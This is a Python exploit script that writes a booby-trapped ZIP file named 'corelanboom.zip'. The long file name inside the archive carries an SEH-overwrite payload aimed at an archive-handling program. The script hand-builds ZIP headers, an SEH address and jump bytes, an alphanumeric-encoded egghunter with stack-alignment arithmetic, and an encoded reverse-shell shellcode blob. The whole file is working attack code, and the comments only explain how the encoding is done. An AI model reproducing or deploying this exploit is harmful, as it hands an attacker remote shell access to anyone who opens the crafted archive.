#!/usr/bin/env python

import struct

ldf_header = "\x50\x4B\x03\x04\x14\x00\x00" + \
             "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" + \
             "\x00\x00\x00\x00\x00\x00\x00\x00" + \
             "\xe4\x0f" + \
             "\x00\x00\x00"

cdf_header = "\x50\x4B\x01\x02\x14\x00\x14" + \
             "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" + \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
             "\xe4\x0f" + \
             "\x00\x00\x00\x00\x00\x00\x01\x00" + \
             "\x24\x00\x00\x00\x00\x00\x00\x00"

eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" + \
                    "\x12\x10\x00\x00" + \
                    "\x02\x10\x00\x00" + \
                    "\x00\x00"

#seh 00435133
#nseh/first_jmp = EB 83 
#89 =	EB
#9F =	83
zero_out_eax = "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"

#badchars = '\x10\x0f\x14\x15\x2f\x3d\x3a\x5b'
seh = '\x33\x51\x43\x00'
first_jmp = "\x89\x9F"
second_jmp = "\x89\x9f"		#second EB 83 jmp
egghunter_0 = (
#align the stack with 1595 bytes
"\x54"			#PUSH ESP
"\x58"			#POP EAX
"\x66\x05\x3b\x06"	#ADD AX, 63b
"\x50"			#PUSH EAX
"\x5c"			#POP ESP
#\x75\xe7\xff\xe7 
#using hex/dword in windows calc
#0 - E7FFE775 = 1800 188B
#7950 5109 + 7950 5109 + 255F7679 = 1800 188B
#0 - 07950 5109 - 79505109 - 255F7679 = E7FFE775 
+ zero_out_eax +
"\x2d\x09\x51\x50\x79"
"\x2d\x09\x51\x50\x79"
"\x2d\x79\x76\x5f\x25"
"\x50"

#\xaf\x75\xea\xaf
+ zero_out_eax + 
"\x2d\x04\x44\x09\x71"
"\x2d\x04\x44\x09\x71"
"\x2d\x49\x02\x03\x6e"
"\x50"

#\x30\x57\x8b\xfa
+ zero_out_eax +
"\x2d\x31\x31\x09\x55"
"\x2d\x31\x31\x09\x55"
"\x2d\x6e\x46\x62\x5b"
"\x50"

#\xef\xb8\x54\x30
+ zero_out_eax +
"\x2d\x66\x66\x31\x56"
"\x2d\x66\x66\x31\x56" 
"\x2d\x45\x7a\x48\x23"
"\x50"

#first half zero_out_eax + short jmp pass the second jump
"\x25\x4a\x4d\x4e\x55"
"\x89\x0a"		#jmp short 10 bytes
)

egghunter_1 = (
"\x25\x35\x32\x31\x2a" 	#other half of zero_out_eax

#\x3c\x05\x5a\x74
"\x68\x3c\x05\x5a\x74" #no restricted characters so we can straight push to stack

#\x02\x58\xcd\x2e
"\x2d\x65\x31\x7f\x65"
"\x2d\x65\x31\x7f\x65"
"\x2d\x34\x45\x34\x06"
"\x50"

#\x0f\x42\x52\x6a
+ zero_out_eax +
"\x2d\x55\x33\x52\x32"
"\x2d\x55\x33\x52\x31"
"\x2d\x47\x57\x09\x32"
"\x50" 	

#\x66\x81\xca\xff
+ zero_out_eax + 
"\x2d\x32\x09\x01\x61"
"\x2d\x32\x09\x01\x61"
"\x2d\x36\x6c\x33\x3e"
"\x50"
)

egg = "T00WT00W"

ESP_align = (
"\x52"		#PUSH EDX
"\x5c" 		#POP ESP
"\x81\xe4\xf0\xff\xff\xff" #AND ESP, FFFFFFF0
)

reverse_shell = (
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x2c\x51\x8b\xf8\x83\xee\xfc\xe2\xf4\xd0\xb9\x09\xf8\x2c\x51"
"\xeb\x71\xc9\x60\x4b\x9c\xa7\x01\xbb\x73\x7e\x5d\x00\xaa\x38"
"\xda\xf9\xd0\x23\xe6\xc1\xde\x1d\xae\x27\xc4\x4d\x2d\x89\xd4"
"\x0c\x90\x44\xf5\x2d\x96\x69\x0a\x7e\x06\x00\xaa\x3c\xda\xc1"
"\xc4\xa7\x1d\x9a\x80\xcf\x19\x8a\x29\x7d\xda\xd2\xd8\x2d\x82"
"\x00\xb1\x34\xb2\xb1\xb1\xa7\x65\x00\xf9\xfa\x60\x74\x54\xed"
"\x9e\x86\xf9\xeb\x69\x6b\x8d\xda\x52\xf6\x00\x17\x2c\xaf\x8d"
"\xc8\x09\x00\xa0\x08\x50\x58\x9e\xa7\x5d\xc0\x73\x74\x4d\x8a"
"\x2b\xa7\x55\x00\xf9\xfc\xd8\xcf\xdc\x08\x0a\xd0\x99\x75\x0b"
"\xda\x07\xcc\x0e\xd4\xa2\xa7\x43\x60\x75\x71\x39\xb8\xca\x2c"
"\x51\xe3\x8f\x5f\x63\xd4\xac\x44\x1d\xfc\xde\x2b\xae\x5e\x40"
"\xbc\x50\x8b\xf8\x05\x95\xdf\xa8\x44\x78\x0b\x93\x2c\xae\x5e"
"\xa8\x7c\x01\xdb\xb8\x7c\x11\xdb\x90\xc6\x5e\x54\x18\xd3\x84"
"\x1c\x92\x29\x39\x4b\x50\x2d\xf7\xe3\xfa\x2c\x55\x59\x71\xca"
"\x3b\x9b\xae\x7b\x39\x12\x5d\x58\x30\x74\x2d\xa9\x91\xff\xf4"
"\xd3\x1f\x83\x8d\xc0\x39\x7b\x4d\x8e\x07\x74\x2d\x44\x32\xe6"
"\x9c\x2c\xd8\x68\xaf\x7b\x06\xba\x0e\x46\x43\xd2\xae\xce\xac"
"\xed\x3f\x68\x75\xb7\xf9\x2d\xdc\xcf\xdc\x3c\x97\x8b\xbc\x78"
"\x01\xdd\xae\x7a\x17\xdd\xb6\x7a\x07\xd8\xae\x44\x28\x47\xc7"
"\xaa\xae\x5e\x71\xcc\x1f\xdd\xbe\xd3\x61\xe3\xf0\xab\x4c\xeb"
"\x07\xf9\xea\x7b\x4d\x8e\x07\xe3\x5e\xb9\xec\x16\x07\xf9\x6d"
"\x8d\x84\x26\xd1\x70\x18\x59\x54\x30\xbf\x3f\x23\xe4\x92\x2c"
"\x02\x74\x2d")


payload = "A"*48 + egghunter_0 + "A"*(171-48-len(egghunter_0))  
payload += second_jmp + "A"*4 + egghunter_1 + "A" * (294-171-4-2-len(egghunter_1))	
payload += first_jmp + "A"*2
payload += seh
payload += egg + ESP_align + reverse_shell 
payload +=  "D"*(4064-294-4-4-8-len(reverse_shell)-len(ESP_align))
payload += ".txt"

print "Size : %d" % len(payload)

with open('./corelanboom.zip', 'w') as f:
    f.write(ldf_header + payload + cdf_header + payload + eofcdf_header + payload)

